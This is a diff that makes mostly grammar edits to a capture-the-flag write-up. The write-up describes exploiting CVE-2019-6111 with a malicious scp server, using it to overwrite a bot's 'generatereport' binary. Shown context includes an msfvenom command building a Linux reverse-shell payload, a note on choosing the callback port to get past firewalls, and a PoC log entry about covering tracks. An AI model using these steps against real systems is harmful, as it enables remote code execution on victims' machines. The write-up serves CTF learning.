@@ -47,7 +47,7 @@ listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes
 13:29:45.356523 IP 35.195.214.46.57194 > REDACTED.2222: Flags [S], seq 3225036092, win 28400, options [mss 1420,nop,nop,TS val 1286466901 ecr 0,nop,wscale 7], length 0
 ~~~
 
-Great, he's using the 2222 port. Since he mentions the "ssh port" and he's requesting a file, we immediately thought of SFTP. After considering some options, we decided using [`paramiko`](https://www.paramiko.org/), a cool Python implementation of the SSH protocol. Luckily, `paramiko` offers some demos which we can modify to suit or needs instead of writing something from scratch. The [`demo_server.py`](https://github.com/paramiko/paramiko/blob/master/demos/demo_server.py) script seemed like a good starting point.
+Great, he's using the 2222 port. Since he mentions the "ssh port" and he's requesting a file, we immediately thought of SFTP. After considering some options, we decided using [`paramiko`](https://www.paramiko.org/), a cool Python implementation of the SSH protocol. Luckily, `paramiko` offers some demos which we can modify to suit our needs instead of writing something from scratch. The [`demo_server.py`](https://github.com/paramiko/paramiko/blob/master/demos/demo_server.py) script seemed like a good starting point.
 
 ## Playing with paramiko
 
@@ -69,7 +69,7 @@ def check_auth_password(self, username, password):
     return paramiko.AUTH_SUCCESSFUL
 ~~~
 
-- Print out whatever the client sends to the server after authentication (with )
+- Print out whatever the client sends to the server after authentication
 
 ~~~python
 """
@@ -111,7 +111,7 @@ And just like this, two of my hypothesis went right out the window: Bob was auth
 
 At this point, a lot of googling, frustrated screams and saddening sobs happened. We tried to make `scp` work server-side with `paramiko`, but we were constantly hitting roadblocks. After a while, I desperately cried for help in our team chat, and one of our members suggested using [this amazing PoC for CVE-2019-6111 and CVE-2019-6110](https://www.exploit-db.com/exploits/46193). Even though we had thought of client-side SSH exploits, what interested us the most was the working `scp` server that returned any file that was requested. Yeah, umpteenth reminder that there are people out there way better than me at anything!
 
-But well, let's give it a try! Just by changing interface it listens on...
+But well, let's give it a try! Just by changing the interface it listens on:
 
 ~~~python
 sock.bind(('0.0.0.0', 2222))
@@ -119,7 +119,7 @@ sock.listen(0)
 logging.info('Listening on port 2222...')
 ~~~
 
-And giving our IP to Bob once more...
+And giving our IP to Bob once more:
 
 ~~~
 $ python3 46193.py 
@@ -138,7 +138,7 @@ INFO:root:Covering our tracks by sending ANSI escape sequence
 INFO:paramiko.transport:Disconnect (code 11): disconnected by user
 ~~~
 
-Wow, just with that we see that `data.txt` is the file that Bob requests! And by pure luck it seems the exploit works too. It's just we didn't know what we would want to exploit with it just yet. But Bob said he would "come back to us" with the result of his "job", so let's listen for incoming connections again and see what happens:
+Wow, just with that we see that `data.txt` is the file that Bob requests! And by pure luck it seems the exploit works too. It's just we don't know what we want to exploit with it just yet. But Bob said he would "come back to us" with the result of his "job", so let's listen for incoming connections again and see what happens:
 
 ~~~
 $ sudo tcpdump -nn -i eth0 'port not 443 and port not 80 and port not 22 and tcp'
@@ -169,7 +169,7 @@ Again, we googled a lot at this point to see what this `generatereport` was and 
 
 We have a functional PoC of CVE-2019-6111 to overwrite additional files other than the one requested via `scp`. Why don't we try to overwrite that `generatereport`, whatever it is? (assuming it's in the same directory where `data.txt` is being requested!)
 
-To confirm this, we firstly altered the exploit so that it sent an innocuous `generatereport` file to see what happened. And after setting the server up and speaking with Bob again, we happily checked that we no longer received the connection to the 2223 port after Bob's `scp`. It seemed that our hypothesis was correct and `generatereport` was overwritten. Time to deliver a real payload!
+To confirm this, we firstly altered the exploit so that it sent an innocuous `generatereport` file to see what happened. And after setting the server up and speaking with Bob again, we happily checked that we no longer received the connection to port 2223 after Bob's `scp`. It seemed that our hypothesis was correct and `generatereport` was overwritten. Time to deliver a real payload!
 
 ~~~
 # msfvenom -p linux/x86/shell_reverse_tcp LHOST=REDACTED LPORT=2223 -f elf -o sploit
@@ -181,7 +181,7 @@ Final size of elf file: 152 bytes
 Saved as: sploit
 ~~~
 
-We used port 2223 with our reverse shell to make sure the victim could go out through that port and no firewall would block us.
+**Note:** We used port 2223 with our reverse shell to make sure the victim could go out through that port and no firewall would block us.
 
 Once the malicious executable was set, we modified the exploit to deliver it instead of the default payload:
 
